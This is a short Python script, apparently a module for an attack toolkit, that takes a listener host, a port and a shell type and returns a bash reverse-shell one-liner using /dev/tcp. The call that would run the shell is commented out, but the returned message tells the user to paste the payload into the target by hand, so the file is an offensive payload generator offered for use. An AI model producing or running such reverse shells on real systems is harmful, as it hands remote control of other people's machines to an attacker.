#!/usr/bin/env python3
import os

def run(params):
    lhost = params.get("lhost")
    lport = params.get("lport")
    shell_type = params.get("shell_type", "bash")

    cmd = f"{shell_type} -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    # In real exploit you'd execute it
    # os.system(cmd)
    return {
        "generated_payload": cmd,
        "note": "Payload not executed for safety. Paste into target manually."
    }
